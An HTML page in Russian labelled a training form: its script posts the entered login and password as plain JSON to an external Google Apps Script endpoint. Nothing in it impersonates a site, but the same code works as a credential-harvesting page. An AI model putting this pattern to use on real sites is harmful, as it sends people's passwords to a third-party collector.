<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Учебная форма</title>
<style>
body { font-family: Arial, sans-serif; padding: 20px; }
form { max-width: 300px; margin: auto; }
input { width: 100%; padding: 8px; margin: 5px 0; }
button { width: 100%; padding: 10px; background: #4CAF50; color: white; border: none; }
#log { margin-top: 20px; font-size: 14px; color: green; }
</style>
</head>
<body>

<h2>Учебная форма</h2>
<form id="demoForm">
  <input type="text" id="username" placeholder="Логин" required>
  <input type="password" id="password" placeholder="Пароль" required>
  <button type="submit">Отправить</button>
</form>

<div id="log"></div>

<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxwjLFe3xGp4u50qhuPVCOGdg3Wu_CWoKUhVhA0CycY0FFEyojvQnxh73anaMCrG7j_/exec"; // URL из Google Apps Script

document.getElementById('demoForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    fetch(SCRIPT_URL, {
        method: 'POST',
        body: JSON.stringify({ username, password }),
        headers: { "Content-Type": "application/json" }
    })
    .then(res => res.text())
    .then(txt => {
        document.getElementById('log').innerText = "Данные отправлены!";
    })
    .catch(err => {
        document.getElementById('log').innerText = "Ошибка: " + err;
    });
});
</script>

</body>
</html>
